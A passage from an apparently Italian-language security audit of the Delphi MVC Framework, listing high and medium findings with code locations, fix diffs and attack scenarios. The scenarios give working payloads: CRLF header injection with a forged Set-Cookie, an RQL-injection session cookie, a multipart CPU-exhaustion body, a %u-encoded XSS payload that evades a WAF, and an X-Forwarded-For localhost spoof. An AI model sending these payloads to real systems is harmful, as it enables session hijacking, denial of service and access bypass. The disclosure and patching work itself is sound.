`SetCustomHeader`). Tutti gli altri percorsi scrivono la `TStrings` grezza:

| Sito | Codice |
|---|---|
| `MVCFramework.pas:4456` | `Response.CustomHeaders.AddStrings(MVCResponse.fHeaders)` — come **ogni** header di `IMVCResponse` arriva sul filo |
| `MVCFramework.pas:6039` | `TMVCResponseBuilder.Header`: `fHeaders.Values[Name] := Value` |
| `MVCFramework.pas:5929-5934` | `Redirect(Location, StatusCode)` → `.Header('location', Location)` |
| `MVCFramework.pas:4772,4774,4788,4790` | `Render201Created` / `Render204NoContent` → `CustomHeaders.AddPair('location', ...)` |
| `Indy.Response.pas:164-167`, `HttpSys.Response.pas:194-197`, `WebBroker.Response.pas:162-165` | `SetLocation` |
| `MVCFramework.Filters.pas:1666` | filtro redirect: `CustomHeaders.Values['Location'] := lTarget` |
| `MVCFramework.Middleware.CORS.pas:149-157` | tutti gli header CORS |

Il CR/LF è raggiungibile dalla richiesta: i query param sono URL-decoded a
`sources/MVCFramework.Indy.Request.pas:209-215`, quindi `%0d%0a` diventa un CRLF reale.

**Prova sul filo (Indy, tracciata).** `Flush` copia le stringhe grezze in `FResponseInfo.CustomHeaders`
(`Indy.Response.pas:226-227`, solo `Trim`) → `TIdHeaderList.SetValue` (`IdHeaderList.pas:455-476`) non valida
CR/LF, e `FoldLength` è `MaxInt` per `QuoteHTTP` (`:236`), quindi nessun folding →
`TIdHTTPResponseInfo.WriteHeader` fa `FConnection.IOHandler.Write(RawHeaders)` verbatim.

**Scenario** (qualunque app che faccia `Result := Redirect(Context.Request.QueryStringParam('next'))`, il
pattern canonico del login):

```http
GET /login?next=/home%0d%0aSet-Cookie:%20session=attacker%0d%0aX:%20 HTTP/1.1
Host: victim
```

→ la risposta contiene un `Set-Cookie` scelto dall'attaccante (session fixation). Estendendo con
`%0d%0a%0d%0aHTTP/1.1 200 OK...` si ottiene response splitting / cache poisoning verso una cache condivisa.

**Fix consigliato** — un choke point per host nel loop di flush, così copre ogni writer presente e futuro:

```diff
--- a/sources/MVCFramework.Indy.Response.pas   (:226-227)
-    FResponseInfo.CustomHeaders.Values[FCustomHeaders.Names[I]] :=
-      Trim(FCustomHeaders.ValueFromIndex[I]);
+    FResponseInfo.CustomHeaders.Values[MVCStripCRLF(FCustomHeaders.Names[I])] :=
+      MVCStripCRLF(Trim(FCustomHeaders.ValueFromIndex[I]));
```
```diff
--- a/sources/MVCFramework.HttpSys.Response.pas   (:311-312, :294)
-    lHeaderName := FCustomHeaders.Names[I];
-    lHeaderValue := Trim(FCustomHeaders.ValueFromIndex[I]);
+    lHeaderName := MVCStripCRLF(FCustomHeaders.Names[I]);
+    lHeaderValue := MVCStripCRLF(Trim(FCustomHeaders.ValueFromIndex[I]));
-    lLocationAnsi := UTF8String(FLocation);
+    lLocationAnsi := UTF8String(MVCStripCRLF(FLocation));
```
```diff
--- a/sources/MVCFramework.pas   (:6039 — copre il percorso WebBroker/ISAPI/Apache, che non ha loop di flush)
-  fHeaders.Values[Name] := Value;
+  fHeaders.Values[MVCStripCRLF(Name)] := MVCStripCRLF(Value);
```

---

### H-06 — HIGH — (B) `TMVCRESTClient` accetta qualunque certificato TLS per default

**File:** `sources/MVCFramework.RESTClient.pas:1562-1569`; hook a `:973`; `fValidateServerCertificate := nil` a `:983`.

```pascal
procedure TMVCRESTClient.DoValidateServerCertificate(...; var aAccepted: Boolean);
begin
  if Assigned(fValidateServerCertificate) then
    fValidateServerCertificate(aSender, aRequest, aCertificate, aAccepted)
  else
    aAccepted := True;                       // accettazione incondizionata
end;
```

**Perché non è teorico.** Nella RTL (`System.Net.HttpClient.pas:1193-1214`, `:1368`)
`DoValidateServerCertificate` viene invocata **solo** su `TExecutionResult.ServerCertificateInvalid`, cioè quando
il certificato ha **già** fallito la validazione di piattaforma. Senza handler la RTL solleva
`ENetHTTPCertificateException` — **fail-closed**. DMVC assegna un handler che ritorna `True`, e la RTL prosegue
con `DoServerCertificateAccepted`, che su Windows (`System.Net.HttpClient.Win.pas:1857-1858`) imposta
`SECURITY_FLAG_IGNORE_UNKNOWN_CA or IGNORE_CERT_WRONG_USAGE or IGNORE_CERT_CN_INVALID or
IGNORE_CERT_DATE_INVALID` e ritenta.

DMVC quindi **converte attivamente il default fail-closed della RTL in "accetta self-signed / scaduto / hostname
sbagliato / CA sconosciuta"**. Il commento doc a `sources/MVCFramework.RESTClient.Intf.pas:88` lo presenta come
una feature: *"By default all certificates are accepted."*

**Scenario.** Qualunque servizio DMVC che chiami HTTPS in uscita con `IMVCRESTClient` (incluso l'executor
JSON-RPC) è MITM-abile da chi è on-path con un certificato self-signed. Le credenziali nell'header
`Authorization` finiscono all'attaccante.

**Fix consigliato** (attenzione: è un cambio di comportamento 3.x→3.x):

```diff
--- a/sources/MVCFramework.RESTClient.pas
   if Assigned(fValidateServerCertificate) then
     fValidateServerCertificate(aSender, aRequest, aCertificate, aAccepted)
-  else
-    aAccepted := True;
+  // Nessuna policy dell'utente -> si tiene il fail-closed della RTL. Opt-in
+  // esplicito via SetValidateServerCertificateProc.
 end;
```

Se il break non è accettabile per la 3.5, gate su una `var` a livello di unit
(`MVCRESTClientAcceptInvalidCertificates: Boolean = False`) con un `LogW` rumoroso quando si accetta comunque.

---

### H-07 — HIGH — (B) Il wizard genera un segreto JWT hardcoded che aggira `CheckJWTSecret`

**File:** `ideexpert/templates/engineconfig.pas.tpro:210`, `:228`; `ideexpert/templates/webmodule.pas.tpro:216`,
`:235`; `ideexpert/templates/dotenv.tpro:94`.

```pascal
dotEnv.Env('JWT_SECRET', 'change-this-secret-in-production-use-strong-key')
```

`TJWT.CheckJWTSecret` (`sources/MVCFramework.JWT.pas:380-395`) rifiuta il segreto demo pubblicato
(`MVC_JWT_INSECURE_DEFAULT_SECRET = 'D3lph1MVCFram3w0rk'`, advisory GHSA-hgv7-ch4w-2f47) e il segreto vuoto.
Non rifiuta questo, perché è una stringa diversa — ma è **altrettanto pubblica**: sta nel repository del wizard.

**Scenario.** Un deploy in cui `.env` manca, non viene letto (working directory sbagliata sotto ISAPI o come
servizio Windows), o in cui qualcuno ha rimosso la chiave: l'app parte **senza errori** e firma i JWT con una
stringa nota. Chiunque forgia un token con `username` e `roles` arbitrari → autenticazione come qualunque utente,
ruolo admin compreso. Nessun segnale né a startup né a runtime.

È esattamente lo scenario che GHSA-hgv7-ch4w-2f47 ha chiuso a livello di framework, e che il wizard riapre a
livello di codice generato.

**Fix consigliato:**

```diff
--- a/ideexpert/templates/engineconfig.pas.tpro   (:210, :228 — idem webmodule.pas.tpro:216,235)
-      dotEnv.Env('JWT_SECRET', 'change-this-secret-in-production-use-strong-key'),
+      dotEnv.Env('JWT_SECRET'),   // nessun default: se manca la chiave, l'app non parte
```

e in cima a `ConfigureEngine`, prima di costruire il middleware: `dotEnv.RequireKeys(['JWT_SECRET']);`.
In `dotenv.tpro:94` lasciare la chiave **vuota** (`JWT_SECRET=`) con un commento su come generarla, invece di un
valore che sembra funzionante.

---

### H-08 — HIGH — (A) RQL injection nel session store su database

**File:** `sources/MVCFramework.Session.Database.pas:194-202`

```pascal
TMVCActiveRecord.DeleteRQL<TMVCSessionActiveRecord>('eq(session_id, "' + ASessionID + '")');       // :197
Result := TMVCActiveRecord.Count<TMVCSessionActiveRecord>(
  Format('eq(session_id, "%s")', [aSessionID])) = 1;                                                // :202
```

`ASessionID` arriva da `ExtractSessionIdFromRequest` (`MVCFramework.pas:3352`) — cookie o query param,
URL-decoded, **senza alcuna validazione**. Il quoting è fatto a mano concatenando `"`; il lexer RQL riconosce
`\"` come quote escapata (`RQL.Parser.pas:1099-1107`) ma **non** `""`, quindi un `"` chiude la stringa e il
resto dell'ID viene interpretato come espressione RQL.

**Scenario:**

```http
Cookie: dtsessionid=x")|ge(session_expiration,"1900-01-01
```

trasforma la `DELETE ... WHERE session_id = 'x'` in una `DELETE` con condizione scelta dall'attaccante:
**cancellazione di massa delle sessioni** (logout forzato di tutti, DoS) da un client non autenticato,
raggiungibile da qualunque endpoint che chiami `SessionStop`.

Non è SQL injection: i *valori* RQL sono correttamente quotati dai compiler (vedi §6). È manipolazione della
`WHERE` di una `DELETE`.

**Fix consigliato** — usare l'API parametrizzata:

```diff
--- a/sources/MVCFramework.Session.Database.pas
 procedure TMVCWebSessionDatabaseFactory.TryDeleteSessionID(const ASessionID: String);
+var
+  lSess: TMVCSessionActiveRecord;
 begin
   inherited;
-  TMVCActiveRecord.DeleteRQL<TMVCSessionActiveRecord>('eq(session_id, "' + ASessionID + '")');
+  lSess := TMVCActiveRecord.GetByPK<TMVCSessionActiveRecord>(ASessionID, False);
+  if Assigned(lSess) then
+    try lSess.Delete; finally lSess.Free; end;
 end;
```

(idem per `TryFindSessionID`, con `GetByPK` e free dell'istanza. `GetByPK` è parametrizzato —
`ActiveRecord.pas:5917-5930` genera `WHERE pk = :pk`.) La validazione charset di C-02 in
`ExtractSessionIdFromRequest` è la difesa di fondo che copre tutti e tre i backend.

---

### H-09 — HIGH — (A) `TMVCJWTAuthenticationMiddleware`: due booleani di autorizzazione non inizializzati (fail-open)

**File:** `sources/MVCFramework.Middleware.JWT.pas:637-638`, uso a `:649` e `:750-753`.

```pascal
var
  AuthRequired: Boolean;      // :637  mai inizializzata
  IsAuthorized: Boolean;      // :638  mai inizializzata
begin
  if Assigned(FAuthenticationHandler) then
  begin
    FAuthenticationHandler.OnRequest(AContext, ..., AuthRequired);        // :649  parametro `var`
    if not AuthRequired then
    begin
      AHandled := False;
      ... Exit;                                                          // :693  salta TUTTA l'autenticazione
    end;
  end;
  ...
    FAuthenticationHandler.OnAuthorization(AContext, ..., IsAuthorized);  // :750
    if not IsAuthorized then raise EMVCJWTException...Forbidden;         // :752
```

`IMVCAuthenticationHandler.OnRequest` / `.OnAuthorization` (`MVCFramework.pas:764-774`) dichiarano quei parametri
come `var`, non `out`. In Delphi né `var` né `out` azzerano un `Boolean`. Se l'implementazione di un handler
personalizzato non assegna il parametro su un ramo — facile, la firma non lo impone — il valore letto è
**spazzatura di stack**, e il fallimento è nella direzione sbagliata: `AuthRequired = False` salta l'intera
autenticazione, `IsAuthorized = True` concede l'accesso.

Prova che è una svista e non una scelta: gli altri due middleware inizializzano correttamente —
`sources/MVCFramework.Middleware.Authentication.pas:253` e `:414` fanno `IsAuthorized := False;` prima della
chiamata. Solo il middleware JWT non lo fa, e nessuno dei tre inizializza `AuthRequired`.

**Scenario.** Un handler custom (il pattern documentato: si implementa `IMVCAuthenticationHandler` a mano) con un
`case`/`if` che non copre un ramo. Comportamento non deterministico, dipendente dal contenuto dello stack: il bug
che passa i test e cede in produzione sotto carico, aprendo endpoint protetti.

**Fix consigliato** — tre righe, deny by default:

```diff
--- a/sources/MVCFramework.Middleware.JWT.pas
 begin
+  AuthRequired := True;   // deny by default: un handler che non assegna deve chiudere, non aprire
+  IsAuthorized := False;
   if Assigned(FAuthenticationHandler) then
```
```diff
--- a/sources/MVCFramework.Middleware.Authentication.pas   (:202 e :403)
 begin
+  AuthRequired := True;
   FAuthenticationHandler.OnRequest(AContext, AControllerQualifiedClassName, AActionName, AuthRequired);
```

---

### H-10 — HIGH — (A) Parser multipart O(parti × body): 36 minuti di CPU da una richiesta da 5 MiB

**File:** `sources/MVCFramework.Indy.Request.pas:812`, helper a `:690`, loop a `:793`.

```pascal
lHeaderEnd := IndexOfBytes(lRaw, lCRLF2, lPartStart);   // :812
```

`IndexOfBytes` (`:690`) è un matcher naïf che scandisce fino alla **fine dell'intero body**; la ricerca non è
limitata da `lPartEnd`, appena calcolato una riga sopra (`:806-809`). Quando una parte non ha `CRLFCRLF`, ogni
iterazione del loop esterno `while lPos >= 0` (`:793`) riscandisce tutto il buffer residuo.

**Misurato** (copia verbatim di `IndexOfBytes` + del loop, body = `--b\r\n` ripetuto):

| body | parti | tempo |
|---|---|---|
| 64 KB | 13 107 | 0,37 s |
| 128 KB | 26 214 | 1,34 s |
| 256 KB | 52 428 | 5,41 s |
| 512 KB | 104 857 | **21,7 s** |

Pulito 4× per raddoppio. Estrapolato al limite di default di 5 MiB: **≈ 36 minuti al 100 % di CPU, su un thread
di connessione Indy, per una sola richiesta.** Poche richieste saturano tutti i core.

**Scenario:**

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=b
Content-Length: 5242880

--b\r\n--b\r\n--b\r\n…      (ripetuto fino a 5 MiB, nessun header, nessun CRLFCRLF)
```

**Fix consigliato:**

```diff
--- a/sources/MVCFramework.Indy.Request.pas
-function IndexOfBytes(const AHaystack, ANeedle: TBytes; const AStart: Integer): Integer;
+function IndexOfBytes(const AHaystack, ANeedle: TBytes; const AStart: Integer;
+  const AEnd: Integer = -1): Integer;
@@
   lHayLen := Length(AHaystack);
+  if (AEnd >= 0) and (AEnd < lHayLen) then
+    lHayLen := AEnd;
@@ ParseMultipartContent, :812
-  lHeaderEnd := IndexOfBytes(lRaw, lCRLF2, lPartStart);
+  lHeaderEnd := IndexOfBytes(lRaw, lCRLF2, lPartStart, lPartEnd);
```

Da solo rende lineare l'intera scansione.

---

### H-11 — HIGH — (B) Mass assignment è il comportamento di default, e lo scaffold e i sample lo insegnano

**Il meccanismo.** `sources/MVCFramework.Serializer.JsonDataObjects.pas:2461-2481` — `JsonObjectToObject` itera
`lObjType.GetProperties` e scrive **ogni property scrivibile** il cui nome corrisponda a una chiave JSON. Le
uniche guardie sono opt-**out**: `[MVCDoNotDeserialize]` (`:2470`) e una `AIgnoredAttributes` esplicita. Non
esiste allow-list, non esiste un `[MVCBind]` opt-in, e nulla tratta la chiave primaria in modo speciale.

**E la ignore-list non viene mai popolata sul percorso del body:** `sources/MVCFramework.pas:3405` e `:3410`
passano entrambi `[]`. `MVCFromBodyAttribute` (`MVCFramework.pas:320-350`) porta `RootNode` e `BodyValidation` —
nessun filtro di campo.

**Guardie che esistono davvero** (le ho cercate): `TMVCActiveRecord.PrimaryKeyIsAutogenerated` è
`[MVCDoNotDeserialize]` (`ActiveRecord.pas:713-717` — istanza già corretta dello stesso bug, con commento);
`TableName` (`:703`) è read-only e viene saltato dal test `lProp.IsWritable` (`:2472`);
`TMVCActiveRecordController.UpdateEntity` riafferma la chiave dall'URL dopo il binding
(`ActiveRecordController.pas:461-462`).

**Cosa non è protetto: tutto il resto.** `TMVCActiveRecordController.CreateEntity`
(`ActiveRecordController.pas:409-410`) fa `Context.Request.BodyFor<TMVCActiveRecord>(lAR); lAR.Insert;` —
nessuna colonna è off-limits. E `grep -rn "MVCDoNotDeserialize" tools/ ideexpert/` **non restituisce nulla**: né
l'entity generator né `ideexpert/templates/entity.pas.tpro` lo emettono mai.

**Lo scaffold e il sample di punta insegnano il pattern:**
- `ideexpert/templates/controller_people.pas.tpro:93,104` — `CreatePerson([MVCFromBody] Person: TPerson)`, con
  `TPerson.ID` scrivibile (`entity.pas.tpro:20`).
- `samples/articles_crud_server/Controllers.Articles.pas:77-81` — `CreateArticle(const Article: TArticle)` →
  `fArticlesService.Add(Article)`, dove `TArticle` **è** un `TMVCActiveRecord` e `TBaseBO.ID` è una property
  pubblica scrivibile sopra `[MVCTableField('ID',[foPrimaryKey])]` (`BusinessObjects.pas:10-17`).
  `UpdateArticleByID` (`:104`) si ricorda di fare `Article.id := id`; `CreateArticle` no.

**Scenario** — contro qualunque entity con una colonna che il client non dovrebbe possedere (`is_admin`, `role`,
`balance`, `owner_id`):

```http
POST /articles HTTP/1.1
Content-Type: application/json

{"code":"C001","description":"x","price":1,"id":1,"created_at":"1970-01-01T00:00:00"}
```

Ogni colonna mappata, timestamp di audit e flag di autorizzazione compresi, viene scritta dal body.

**Fix consigliato.** Cambiare il default del serializer romperebbe la compatibilità 3.4→3.5 (regola di progetto),
e un opt-in `[MVCBind]` è un cambio API da 4.0. La modifica minima che aiuta davvero è nei due punti generati:

```diff
--- a/ideexpert/templates/entity.pas.tpro
     [MVCTableField('ID', [foPrimaryKey, foAutoGenerated])]
+    [MVCDoNotDeserialize]
     FID: Integer;
```

più la stessa cosa in `tools/entitygenerator`. E correggere `samples/articles_crud_server` perché smetta di
insegnare il pattern.

---

### M-01 — MEDIUM — (A) `Transfer-Encoding: chunked` aggira completamente `MaxRequestSize` su Indy Direct

**File:** `sources/MVCFramework.pas:2830-2835`, `sources/MVCFramework.Indy.Request.pas:582-585`.

`TMVCIndyDirectRequest.GetContentLength` restituisce `FRequestInfo.ContentLength`. In Indy
(`IdCustomHTTPServer.pas:1200-1234`) il ramo chunked legge l'intero body in un `TMemoryStream` **senza mai
assegnare `ContentLength`**, che resta al default `GFContentLength = -1` (`:190`). Quindi `-1 > 5 MiB` è `False`
e il guard passa.

Due problemi distinti: (a) chunked bypassa del tutto il limite, body illimitato in RAM; (b) anche con
`Content-Length`, il guard scatta **dopo** che Indy ha già letto e allocato tutto — è policy, non protezione di
memoria. Nessun `MaxPostSize` è impostato sul server Indy (`sources/MVCFramework.Server.Indy.pas:116-131`).

**Scenario:** `POST` con `Transfer-Encoding: chunked` e chunk da 1 MiB ripetuti, senza mai il chunk terminatore.
Il worker alloca finché il processo non esaurisce la memoria (~2 GiB su Win32). Non autenticato.

Su HTTP.sys il guard tiene (ma vedi C-04, che è peggio). Su ISAPI/Apache il container limita a monte.

**Fix consigliato:** agganciare `OnCreatePostStream` sul `TIdHTTPServer` restituendo uno stream che solleva oltre
`MaxRequestSize`. Se si preferisce la via minima, rendere esplicito il buco nel changelog: oggi
`MaxRequestSize` dà una falsa sensazione di protezione su Indy.

---

### M-02 — MEDIUM — (A) Indy decodifica `%uXXXX` e cancella `%zz`; gli altri due host no (WAF evasion)

**File:** `IdURI.pas` (`TIdURI.URLDecode`, ramo `CharIsInSet(ASrc, i, 'uU')` e `try…except` attorno a
`IndyStrToInt('$'+ESC)`) vs `System.NetEncoding.pas` (`TNetEncoding.URL.Decode`, guardia
`IsHexChar(Sp[1]) and IsHexChar(Sp[2])`). Consumatori: `sources/MVCFramework.Indy.Request.pas:209-215`,
`sources/MVCFramework.HttpSys.Request.pas:174-177`, `:916-922`.

- `TIdURI.URLDecode` supporta la forma non standard IIS `%uXXXX`: `%u003C` → `<`, `%u0027` → `'`.
- E **cancella silenziosamente** un escape malformato: `%zz` → niente, quindi `ad%zzmin` → `admin`.
- `TNetEncoding.URL.Decode` (HTTP.sys) lascia entrambe le forme **letterali**.

**Scenario:**

```http
GET /search?q=%u003Cscript%u003Ealert(1)%u003C/script%u003E HTTP/1.1
```

La signature WAF per `<script` non scatta (nessun `<` nei byte). Su **Indy** l'action riceve
`<script>alert(1)</script>`. Su **HTTP.sys / WebBroker** riceve il letterale innocuo. Stesso trucco con
`ad%zzmin` per aggirare una deny-list su path o parametro, solo su Indy.

Questo split raggiunge anche i **path parameter su ogni host**, perché `Router.pas:611` usa
`TIdURI.URLDecode` incondizionatamente — ma `PathEncode` a `Router.pas:455` escapa il `%` solitario di `%uXXXX`
in `%25` prima, quindi quel percorso è protetto **per caso**. Il percorso query no.

**Fix consigliato:** usare lo stesso decoder su tutti e tre gli host per query e path — la scelta sicura è
`TNetEncoding.URL.Decode` (rifiuta l'escape non standard e conserva il malformato). Se cambiare decoder è troppo
invasivo per la 3.5, almeno documentare che con Indy il decoder è più permissivo del proxy davanti.

---

### M-03 — MEDIUM — (A) `QueryStringParam` e `QueryParams` dissentono su quale duplicato vince

**File:** `sources/MVCFramework.Indy.Request.pas:653-657` (first wins, `Values[]`) vs `:504`
(`AddOrSetValue`, last wins); `sources/MVCFramework.HttpSys.Request.pas:840-844` vs `:695` — stesso schema.

`?role=user&role=admin`, sulla **stessa richiesta**:
- `Context.Request.QueryStringParam('role')` → `user`
- `Context.Request.QueryParams['role']` → `admin`

Qualunque codice che valida con un accessor e usa l'altro è un bypass di autorizzazione diretto. Ed è la classica
divergenza proxy-vs-app da HTTP Parameter Pollution: nginx (`$arg_x`) e la maggior parte dei WAF prendono il
**primo**, il dizionario di DMVC prende l'**ultimo**.

**Fix consigliato:** far concordare i due accessor. `QueryParams` deve essere first-wins come
`QueryStringParam`, oppure — meglio — esporre esplicitamente la lista di tutti i valori e far scegliere al dev:

```diff
--- a/sources/MVCFramework.Indy.Request.pas   (:504; idem HttpSys.Request.pas:695)
-  FQueryParams.AddOrSetValue(lName, lValue);
+  if not FQueryParams.ContainsKey(lName) then     // first wins, come QueryStringParam
+    FQueryParams.Add(lName, lValue);
```

---

### M-04 — MEDIUM — (B) Messaggio di eccezione grezzo nella risposta anche in build RELEASE

**File:** `sources/MVCFramework.pas:5290` (`TMVCRenderer.Render(AException)`), `:3236` (`SendHTTPStatus`).

L'hardening è a metà: `R.Classname` è nascosto fuori da `DEBUG` (`:5292-5296`) e `ResponseErrorPage` è
correttamente generico in RELEASE (`:3771-3782`). Ma `R.Message := AException.Message;` (`:5290`) è **sempre**
inviato, e il ramo senza controller selezionato fa
`SendHTTPStatus(..., Format('[%s] %s', [Ex.Classname, Ex.Message]), Ex.Classname)` (`:3236`) **senza nemmeno la
guardia DEBUG**.

Il gestore globale (`:3207-3240`) instrada **qualunque** eccezione non-`EMVCException` qui con un 500. Il
messaggio di una `EFDDBEngineException` di FireDAC contiene lo statement SQL completo e il testo d'errore del
motore; quello di una `EInOutArgumentException` contiene il path assoluto server-side (L-02).

**Scenario.** Un input che rompe una query restituisce al client anonimo lo statement SQL con i nomi reali di
tabelle e colonne — ricognizione che, combinata con H-01, elimina il lavoro di indovinare i nomi delle colonne.

```diff
--- a/sources/MVCFramework.pas   (:5290)
-      R.Message := AException.Message;
+      {$IFDEF DEBUG}
+      R.Message := AException.Message;
+      {$ELSE}
+      // Solo le eccezioni del framework hanno un messaggio pensato per il client.
+      if AException is EMVCException then
+        R.Message := AException.Message
+      else
+        R.Message := HTTP_STATUS.ReasonStringFor(GetContext.Response.StatusCode);
+      {$ENDIF}
```

Analogamente a `:3236`. Il dettaglio è già loggato server-side a `:3220-3228`.

---

### M-05 — MEDIUM — (B) Il cookie di sessione non ha `Secure` né `SameSite`, e `HttpOnly` è `False` di default

**File:** `sources/MVCFramework.Session.pas:315-345`, `:96`; `sources/MVCFramework.Middleware.Session.pas:37-39`;
`sources/MVCFramework.Filters.pas:93`.

`SendSessionCookie` imposta `Name`, `Value`, `HttpOnly`, `Expires`, `Path`. **Non imposta `Secure`. Non imposta
`SameSite`.** E `HttpOnly` viene dal factory, il cui default è `False` in tutti e sei i punti d'ingresso
(`UseMemorySessionMiddleware`, `UseFileSessionMiddleware`, `UseDatabaseSessionMiddleware`, e i filtri
`MemorySession`/`FileSession`/`DatabaseSession`). Il commento a `Filters.pas:87` lo dichiara:
`.Use(MemorySession(10))  // 10-minute idle timeout, no HttpOnly`.

Il wizard chiama `UseMemorySessionMiddleware(timeout)` senza secondo argomento
(`engineconfig.pas.tpro:238`) → `HttpOnly = False`. Quindi: token di sessione leggibile da JavaScript (qualunque
XSS diventa furto di sessione), in chiaro su HTTP, e senza `SameSite` esplicito.

Contrasto: il middleware JWT-cookie fa la cosa giusta (`Middleware.JWT.pas:1036,1063`: `FCookieSecure := True`, e
rifiuta `SameSite=None` senza `Secure` a `:1100-1102`). È il session store a essere rimasto indietro.

```diff
--- a/sources/MVCFramework.Session.pas   (SendSessionCookie)
   lCookie.HttpOnly := fHttpOnly;
+  lCookie.Secure := fSecure;
+  {$IF CompilerVersion >= 35.0}
+  lCookie.SameSite := 'Lax';
+  {$ENDIF}
```

con `fSecure` sul factory (default `True`, disattivabile per lo sviluppo in HTTP), e portare `aHttpOnly` a `True`
in tutti e sei i punti d'ingresso — non rompe alcuna API.

---

### M-06 — MEDIUM — (B) La ACL "solo localhost" di `TMVCSystemController` usa l'IP *risolto*, non quello del peer

**File:** `sources/MVCFramework.SysControllers.pas:264-277`

```pascal
ClientIp := Context.Request.ClientIp;
AHandled := not((ClientIp = '::1') or (ClientIp = '127.0.0.1') or ...);
```

`Request.ClientIp` passa da `MVCResolveClientIP` (`Commons.pas:956-970`), che onora `X-Forwarded-For` /
`X-Real-IP` quando `MVCTrustProxyForwardedHeaders` è `True`. Il default è `False` (`Commons.pas:695`) — corretto
— ma qualunque deployment legittimo dietro nginx/IIS ARR/HAProxy lo abilita, ed è proprio il deployment in cui il
controller di sistema smette di essere protetto.

**Scenario** (solo con proxy headers abilitati):

```http
GET /system/serverconfig.info HTTP/1.1
Host: victim
X-Forwarded-For: 127.0.0.1
```

`ServerConfig` (`SysControllers.pas:278-295`) serializza **l'intera `TMVCConfig`**; `DescribeServer` (`:149`)
restituisce la mappa completa di controller, action, path, verbi, `MVCConsumes`/`MVCProduces` e le entità
ActiveRecord registrate. `LoadSystemControllers` è `'true'` di default (`MVCFramework.pas:2573`).

Molte configurazioni di proxy fanno *append* e non *replace* su `X-Forwarded-For`, e `MVCResolveClientIP` prende
il **primo** hop (`Commons.pas:962`), cioè quello fornito dal client.

**Fix consigliato** — una ACL di rete deve guardare il peer, mai un header:

```diff
--- a/sources/MVCFramework.SysControllers.pas
-  ClientIp := Context.Request.ClientIp;
+  // Deliberatamente il peer, non ClientIp: X-Forwarded-For è scrivibile dal
+  // client e questa è una ACL di rete, non logging.
+  ClientIp := Context.Request.PeerIp;
```

Serve esporre il peer IP grezzo su `TMVCWebRequest` (Indy: `FRequestInfo.RemoteIP`; HTTP.sys: `FClientIpStr`,
già presente a `HttpSys.Request.pas:87`; WebBroker: `RemoteAddr`). In alternativa, se non si vuole allargare
l'interfaccia: portare il default di `LoadSystemControllers` a `'false'`.

---

### M-07 — MEDIUM — (B) `TMVCActiveRecordController`: CRUD senza autenticazione per default, in silenzio

**File:** `sources/MVCFramework.ActiveRecordController.pas:341-351`, costruttore a `:55`.

```pascal
if Assigned(fAuthorization) then
  Result := fAuthorization(Context, aClass, aAction)
else
  Result := True;          // :348 — nessuna funzione di autorizzazione => tutto permesso
```

`aAuthorization` ha default `nil`. `TMVCActiveRecordController.Create` senza argomenti pubblica quindi
**GET / POST / PUT / DELETE su ogni entità registrata a chiamanti anonimi**. Fallimento aperto e silenzioso.

Il default corretto sarebbe `False`, ma violerebbe "3.x → 3.x zero cambiamenti API". La versione minima è
renderlo rumoroso, una volta sola alla costruzione:

```diff
   else
   begin
-    Result := True;
+    Result := True;
+    LogW('TMVCActiveRecordController: nessuna funzione di autorizzazione impostata — ' +
+         'ogni entità registrata è leggibile e scrivibile da chiunque.');
   end;
```

---

### M-08 — MEDIUM — (A) Cookie name/value non escapati su Indy e HTTP.sys (WebBroker li escapa)

**File:** `sources/MVCFramework.Indy.Response.pas:236-237`, `sources/MVCFramework.HttpSys.Response.pas:329`.

I tre adapter emettono gli stessi otto campi di `TCookie` (nessun campo è perso dopo `e5a47ea1` — vedi §6), ma
differiscono nell'**encoding**:

- WebBroker → `TCookie.GetHeaderValue`:
  `Format('%s=%s; ', [TNetEncoding.URL.Encode(FName), TNetEncoding.URL.Encode(FValue)])` — percent-encoded.
- HTTP.sys → `lCookieStr := lCookie.Name + '=' + lCookie.Value;` — concatenazione grezza.
- Indy → `CookieName := lCookie.Name; Value := lCookie.Value;` in un `TIdCookie`, scritto senza validazione.

Un'app che scrive un valore controllato dall'utente in un cookie ottiene **attribute injection**
(`; Path=/; Domain=...`) sui due host nativi e header injection completa con CRLF, mentre lo **stesso identico
codice è sicuro sotto WebBroker**. La divergenza fra host è il bug.

```diff
--- a/sources/MVCFramework.HttpSys.Response.pas   (:329)
-    lCookieStr := lCookie.Name + '=' + lCookie.Value;
+    lCookieStr := TNetEncoding.URL.Encode(lCookie.Name) + '=' +
+                  TNetEncoding.URL.Encode(lCookie.Value);
```
```diff
--- a/sources/MVCFramework.Indy.Response.pas   (:236-237)
-      CookieName := lCookie.Name;
-      Value := lCookie.Value;
+      CookieName := TNetEncoding.URL.Encode(lCookie.Name);
+      Value := TNetEncoding.URL.Encode(lCookie.Value);
```

Rende anche i tre host byte-identici — la proprietà di parità che il test di regressione di `e5a47ea1` protegge.

---

### M-09 — MEDIUM — (A) `Range: bytes=0-` bufferizza l'intero file in RAM

**File:** `sources/MVCFramework.Middleware.RangeMedia.pas:346-350`, gemello in `sources/MVCFramework.Filters.pas:~1958-1962`.

```pascal
LContentLength := LRangeEnd - LRangeStart + 1;
LPartialStream := TMemoryStream.Create;
LPartialStream.SetSize(LContentLength);      // nessun tetto
LPartialStream.CopyFrom(LFileStream, LContentLength);
```

`Range: bytes=0-` è ciò che **ogni browser invia per primo** su un `<video>`: un mp4 da 4 GB alloca 4 GB per
richiesta. Il percorso senza `Range` (`:328-334`) fa correttamente streaming del `TFileStream`; solo il percorso
206 bufferizza. ×20 concorrenti → OOM; su Win32 basta una richiesta oltre i ~2 GB.

```diff
     LContentLength := LRangeEnd - LRangeStart + 1;
+    // Cap a 8 MiB per slice: RFC 7233 permette di restituire meno byte di
+    // quanti richiesti, il client ririchiede il resto.
+    if LContentLength > 8 * 1024 * 1024 then
+    begin
+      LRangeEnd := LRangeStart + 8 * 1024 * 1024 - 1;
+      LContentLength := LRangeEnd - LRangeStart + 1;
+    end;
```

(prima dell'header `Content-Range` a `:354`, così l'header resta veritiero.)

---

### M-10 — MEDIUM — (A) Bypass del rate limiter e crescita illimitata dello store

**File:** `sources/MVCFramework.Middleware.RateLimit.pas:230-255`, `:265-267`, `:411-416`.

`CheckRateLimit` chiama `CleanupExpiredEntries` a **ogni** richiesta: itera l'intero `FStorage.Keys` sotto il
lock globale e rimuove solo le finestre già scadute. Nessun tetto alla dimensione del dizionario.

Con `rlkAPIKey` (`:411-416`, chiave = header `X-API-Key` controllato dal client) o `rlkCustom`, ogni valore
distinto crea una entry che vive per l'intera finestra: **rate limit completamente aggirato** ruotando l'header,
e la scansione per-richiesta diventa O(N) sotto un'unica `TCriticalSection` — quadratica nel numero di richieste
